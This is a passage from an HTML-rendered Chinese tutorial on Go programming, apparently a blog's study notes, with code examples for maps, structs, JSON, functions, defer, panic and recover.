class="string">&quot;alice&quot;</span>:   <span class="number">31</span>,</span><br><span class="line">    <span class="string">&quot;charlie&quot;</span>: <span class="number">34</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 赋值与获取</span></span><br><span class="line">ages[<span class="string">&quot;alice&quot;</span>] = <span class="number">32</span></span><br><span class="line">fmt.Println(ages[<span class="string">&quot;alice&quot;</span>]) <span class="comment">// &quot;32&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除</span></span><br><span class="line"><span class="built_in">delete</span>(ages, <span class="string">&quot;alice&quot;</span>) <span class="comment">// remove element ages[&quot;alice&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历</span></span><br><span class="line"><span class="keyword">for</span> name, age := <span class="keyword">range</span> ages &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%s\t%d\n&quot;</span>, name, age)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Struct"><a href="#Struct" class="headerlink" title="Struct"></a>Struct</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">Name   <span class="keyword">string</span></span><br><span class="line">Age    <span class="keyword">int</span></span><br><span class="line">Height <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Man <span class="keyword">struct</span> &#123;</span><br><span class="line">Person <span class="comment">// 匿名嵌入Person类型</span></span><br><span class="line">Sex    <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">p := Person&#123;Name: <span class="string">&quot;Alice&quot;</span>, Age: <span class="number">30</span>, Height: <span class="number">165.0</span>&#125;</span><br><span class="line">fmt.Println(p)</span><br><span class="line">p.Age = <span class="number">31</span></span><br><span class="line">fmt.Println(p)</span><br><span class="line">m := Man&#123;Person: Person&#123;Name: <span class="string">&quot;Bob&quot;</span>, Age: <span class="number">25</span>&#125;, Sex: <span class="string">&quot;M&quot;</span>&#125;</span><br><span class="line">fmt.Println(m)</span><br><span class="line">m.Age = <span class="number">26</span></span><br><span class="line">fmt.Println(m)</span><br><span class="line">per := m.Person</span><br><span class="line">per.Age = <span class="number">27</span></span><br><span class="line">fmt.Println(m)</span><br><span class="line"></span><br><span class="line">p1 := Person&#123;Name: <span class="string">&quot;Alice&quot;</span>, Age: <span class="number">30</span>, Height: <span class="number">165.0</span>&#125;</span><br><span class="line">p2 := Person&#123;Name: <span class="string">&quot;Bob&quot;</span>, Age: <span class="number">25</span>, Height: <span class="number">180.0</span>&#125;</span><br><span class="line">p3 := Person&#123;Name: <span class="string">&quot;Alice&quot;</span>, Age: <span class="number">30</span>, Height: <span class="number">165.0</span>&#125;</span><br><span class="line">fmt.Println(p1 == p2, p1 == p3, p2 == p3)</span><br><span class="line">  </span><br><span class="line">  w := Woman&#123;Person: Person&#123;Name: <span class="string">&quot;Alice&quot;</span>, Age: <span class="number">30</span>, Height: <span class="number">165.0</span>&#125;&#125;</span><br><span class="line">fmt.Println(w == p1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">==============</span><br><span class="line">&#123;Alice <span class="number">30</span> <span class="number">165</span>&#125;</span><br><span class="line">&#123;Alice <span class="number">31</span> <span class="number">165</span>&#125;</span><br><span class="line">&#123;&#123;Bob <span class="number">25</span> <span class="number">0</span>&#125; M&#125;</span><br><span class="line">&#123;&#123;Bob <span class="number">26</span> <span class="number">0</span>&#125; M&#125;</span><br><span class="line">&#123;&#123;Bob <span class="number">26</span> <span class="number">0</span>&#125; M&#125;</span><br><span class="line"><span class="literal">false</span> <span class="literal">true</span> <span class="literal">false</span></span><br><span class="line">invalid operation: w == p1 (mismatched types Woman and Person)</span><br></pre></td></tr></table></figure><h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p := Person&#123;Name: <span class="string">&quot;Alice&quot;</span>, Age: <span class="number">30</span>, Height: <span class="number">165.0</span>&#125;</span><br><span class="line">data, _ := json.MarshalIndent(p, <span class="string">&quot;&quot;</span>, <span class="string">&quot;  &quot;</span>)</span><br><span class="line">fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, data) <span class="comment">// JSON输出 不格式化</span></span><br><span class="line"></span><br><span class="line">p := Person&#123;Name: <span class="string">&quot;Alice&quot;</span>, Age: <span class="number">30</span>, Height: <span class="number">165.0</span>&#125;</span><br><span class="line">data, _ := json.MarshalIndent(p, <span class="string">&quot;&quot;</span>, <span class="string">&quot;  &quot;</span>)</span><br><span class="line">fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, data) <span class="comment">// JSON输出 格式化</span></span><br><span class="line"></span><br><span class="line">p = Person&#123;&#125;</span><br><span class="line">s := <span class="string">&quot;&#123;\&quot;Name\&quot;:\&quot;Alice\&quot;,\&quot;Age\&quot;:30,\&quot;Height\&quot;:165&#125;&quot;</span></span><br><span class="line">json.Unmarshal([]<span class="keyword">byte</span>(s), &amp;p) <span class="comment">// json反序列化</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%+v\n&quot;</span>, p)</span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>函数声明包括函数名、形式参数列表、返回值列表（可省略）以及函数体。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">name</span><span class="params">(parameter-list)</span> <span class="params">(result-list)</span></span> &#123;</span><br><span class="line">    body</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(x <span class="keyword">int</span>, y <span class="keyword">int</span>)</span> <span class="title">int</span></span>   &#123;<span class="keyword">return</span> x + y&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sub</span><span class="params">(x, y <span class="keyword">int</span>)</span> <span class="params">(z <span class="keyword">int</span>)</span></span>   &#123; z = x - y; <span class="keyword">return</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">first</span><span class="params">(x <span class="keyword">int</span>, _ <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123; <span class="keyword">return</span> x &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">zero</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span> <span class="title">int</span></span>      &#123; <span class="keyword">return</span> <span class="number">0</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// func可以当匿名函数</span></span><br><span class="line">a := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">a()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Slice引用传递</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">a := []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">0</span>&#125;</span><br><span class="line">A(a)</span><br><span class="line">fmt.Println(a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">A</span><span class="params">(a []<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">a[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">a[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// [1 1]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组 值传递</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">a := [<span class="number">2</span>]<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">0</span>&#125;</span><br><span class="line">A(a)</span><br><span class="line">fmt.Println(a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">A</span><span class="params">(a [2]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">a[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">a[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// int 类型</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">a := <span class="number">0</span></span><br><span class="line">A(a)</span><br><span class="line">fmt.Println(a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">A</span><span class="params">(a <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">p := Person&#123;Name: <span class="string">&quot;Alice&quot;</span>, Age: <span class="number">30</span>, Height: <span class="number">165.0</span>&#125;</span><br><span class="line">A(p)</span><br><span class="line">fmt.Println(p)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">A</span><span class="params">(a Person)</span></span> &#123;</span><br><span class="line">a.Age = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &#123;Alice 30 165&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象指针</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">p := Man&#123;Person: Person&#123;Name: <span class="string">&quot;Alice&quot;</span>, Age: <span class="number">30</span>, Height: <span class="number">165.0</span>&#125;, Sex: <span class="string">&quot;female&quot;</span>&#125;</span><br><span class="line">A(&amp;p)</span><br><span class="line">fmt.Println(p)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">A</span><span class="params">(a *Man)</span></span> &#123;</span><br><span class="line">a.Person.Age = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &#123;&#123;Alice 1 165&#125; female&#125;</span></span><br></pre></td></tr></table></figure><p>函数像其他值一样，拥有类型，可以被赋值给其他变量，传递给函数，从函数返回。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">square</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123; <span class="keyword">return</span> n * n &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">negative</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123; <span class="keyword">return</span> -n &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">product</span><span class="params">(m, n <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123; <span class="keyword">return</span> m * n &#125;</span><br><span class="line"></span><br><span class="line">f := square</span><br><span class="line">fmt.Println(f(<span class="number">3</span>)) <span class="comment">// &quot;9&quot;</span></span><br><span class="line"></span><br><span class="line">f = negative</span><br><span class="line">fmt.Println(f(<span class="number">3</span>))     <span class="comment">// &quot;-3&quot;</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, f) <span class="comment">// &quot;func(int) int&quot;</span></span><br><span class="line"></span><br><span class="line">f = product <span class="comment">// compile error: can&#x27;t assign func(int, int) int to func(int) int</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>函数类型的零值是nil。调用值为nil的函数值会引起panic错误，函数只能和nil比较，不能和函数比较。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">int</span>)</span> <span class="title">int</span></span></span><br><span class="line">f(<span class="number">3</span>) <span class="comment">// 此处f的值为nil, 会引起panic错误</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">int</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="keyword">if</span> f != <span class="literal">nil</span> &#123; <span class="comment">// 可以和nil比较</span></span><br><span class="line">  f(<span class="number">3</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数当做参数传参</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add1</span><span class="params">(r <span class="keyword">rune</span>)</span> <span class="title">rune</span></span> &#123; <span class="keyword">return</span> r + <span class="number">1</span> &#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(strings.Map(add1, <span class="string">&quot;HAL-9000&quot;</span>)) <span class="comment">// &quot;IBM.:111&quot;</span></span><br><span class="line">fmt.Println(strings.Map(add1, <span class="string">&quot;VMS&quot;</span>))      <span class="comment">// &quot;WNT&quot;</span></span><br><span class="line">fmt.Println(strings.Map(add1, <span class="string">&quot;Admix&quot;</span>))    <span class="comment">// &quot;Benjy&quot;</span></span><br></pre></td></tr></table></figure><p>可变参数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(vals ...<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    total := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _, val := <span class="keyword">range</span> vals &#123;</span><br><span class="line">        total += val</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(sum())           <span class="comment">// &quot;0&quot;</span></span><br><span class="line">fmt.Println(sum(<span class="number">3</span>))          <span class="comment">// &quot;3&quot;</span></span><br><span class="line">fmt.Println(sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)) <span class="comment">// &quot;10&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Deferred"><a href="#Deferred" class="headerlink" title="Deferred"></a>Deferred</h3><p>defer关键字的作用：包含该defer语句的函数执行完毕时，defer后的函数才会被执行，不论包含defer语句的函数是通过return正常结束，还是由于panic导致的异常结束。你可以在一个函数中执行多条defer语句，它们的执行顺序与声明顺序相反。</p><p>处理互斥锁</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mu sync.Mutex</span><br><span class="line"><span class="keyword">var</span> m = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookup</span><span class="params">(key <span class="keyword">string</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    mu.Lock()</span><br><span class="line">    <span class="keyword">defer</span> mu.Unlock()</span><br><span class="line">    <span class="keyword">return</span> m[key]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记录调用时间</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bigSlowOperation</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 不要忘记defer语句后的圆括号，否则本该在进入时执行的操作会在退出时执行，而本该在退出时执行的，永远不会被执行。</span></span><br><span class="line">  <span class="comment">// 如果不加括号的话 会在return后直接打印enter</span></span><br><span class="line">    <span class="keyword">defer</span> trace(<span class="string">&quot;bigSlowOperation&quot;</span>)() <span class="comment">// don&#x27;t forget the extra parentheses</span></span><br><span class="line">    <span class="comment">// ...lots of work…</span></span><br><span class="line">    time.Sleep(<span class="number">10</span> * time.Second) <span class="comment">// simulate slow operation by sleeping</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">trace</span><span class="params">(msg <span class="keyword">string</span>)</span> <span class="title">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    start := time.Now()</span><br><span class="line">    log.Printf(<span class="string">&quot;enter %s&quot;</span>, msg)</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; </span><br><span class="line">        log.Printf(<span class="string">&quot;exit %s (%s)&quot;</span>, msg,time.Since(start)) </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--------------</span><br><span class="line"><span class="number">2023</span>/<span class="number">04</span>/<span class="number">28</span> <span class="number">14</span>:<span class="number">31</span>:<span class="number">53</span> enter main</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">04</span>/<span class="number">28</span> <span class="number">14</span>:<span class="number">31</span>:<span class="number">53</span> exit main (<span class="number">141.096</span>µs)</span><br></pre></td></tr></table></figure><h3 id="Panic异常"><a href="#Panic异常" class="headerlink" title="Panic异常"></a>Panic异常</h3><p>Panic异常指的是运行中的异常，如数组越界、空指针等，当panic异常发生时，程序会中断运行，并立即执行在该goroutine中被延迟的函数（defer 机制），由于panic会导致程序中断运行，所以一般用来当一些必要参数缺失时候 可以使用panic。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// regexp.MustCompile()方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MustCompile</span><span class="params">(str <span class="keyword">string</span>)</span> *<span class="title">Regexp</span></span> &#123;</span><br><span class="line">regexp, err := Compile(str)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">`regexp: Compile(`</span> + quote(str) + <span class="string">`): `</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> regexp</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>panic会执行在defer之后，在Go的panic机制中，延迟函数的调用在释放堆栈信息之前。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> trace(<span class="string">&quot;main&quot;</span>)() <span class="comment">// 打印: exit main (100ms)</span></span><br><span class="line">j := <span class="number">0</span></span><br><span class="line">i := <span class="number">1</span> / j</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--------------</span><br><span class="line"><span class="number">2023</span>/<span class="number">04</span>/<span class="number">28</span> <span class="number">14</span>:<span class="number">53</span>:<span class="number">24</span> enter main</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">04</span>/<span class="number">28</span> <span class="number">14</span>:<span class="number">53</span>:<span class="number">24</span> exit main (<span class="number">157.698</span>µs)</span><br><span class="line"><span class="built_in">panic</span>: runtime error: integer divide by zero</span><br><span class="line"></span><br><span class="line">goroutine <span class="number">1</span> [running]:</span><br><span class="line">main.main()</span><br><span class="line">        /Users/fireflying/<span class="keyword">go</span>/src/test/main.<span class="keyword">go</span>:<span class="number">31</span> +<span class="number">0xee</span></span><br><span class="line">exit status <span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="Recover捕获异常"><a href="#Recover捕获异常" class="headerlink" title="Recover捕获异常"></a>Recover捕获异常</h3><p>当web服务器遇到不可预料的严重问题时，在崩溃前应该将所有的连接关闭；如果不做任何处理，会使得客户端一直处于等待状态。</p><p>就好比regexp.MustCompile()方法，如果它panic异常了，是不是程序就中断了，对于web服务器来说，这会导致服务崩溃。</p><p>如果在deferred函数中调用了内置函数recover，并且定义该defer语句的函数发生了panic异常，recover会使程序从panic中恢复，并返回panic value。导致panic异常的函数不会继续运行，但能正常返回。在未发生panic时调用recover，recover会返回nil。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 使用recover()捕获panic产生的异常。</span></span><br><span class="line"><span class="keyword">if</span> p := <span class="built_in">recover</span>(); p != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;run time panic: %v&quot;</span>, p)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">j := <span class="number">0</span></span><br><span class="line">i := <span class="number">1</span> / j</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以使用switch来对recover进行类型判断，通过不同的类型来处理</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// soleTitle returns the text of the first non-empty title element</span></span><br><span class="line"><span class="comment">// in doc, and an error if there was not exactly one.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">soleTitle</span><span class="params">(doc *html.Node)</span> <span class="params">(title <span class="keyword">string</span>, err error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">type</span> bailout <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> p := <span class="built_in">recover</span>(); p &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="literal">nil</span>:       <span class="comment">// no panic</span></span><br><span class="line">        <span class="keyword">case</span> bailout&#123;&#125;: <span class="comment">// &quot;expected&quot; panic</span></span><br><span class="line">            err = fmt.Errorf(<span class="string">&quot;multiple title elements&quot;</span>)</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">panic</span>(p) <span class="comment">// unexpected panic; carry on panicking</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="comment">// Bail out of recursion if we find more than one nonempty title.</span></span><br><span class="line">    forEachNode(doc, <span class="function"><span class="keyword">func</span><span class="params">(n *html.Node)</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> n.Type == html.ElementNode &amp;&amp; n.Data == <span class="string">&quot;title&quot;</span> &amp;&amp;</span><br><span class="line">            n.FirstChild != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> title != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">                <span class="built_in">panic</span>(bailout&#123;&#125;) <span class="comment">// multiple titleelements</span></span><br><span class="line">            &#125;</span><br><span class="line">            title = n.FirstChild.Data</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="literal">nil</span>)</span><br><span class="line">    <span class="keyword">if</span> title == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, fmt.Errorf(<span class="string">&quot;no title element&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> title, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 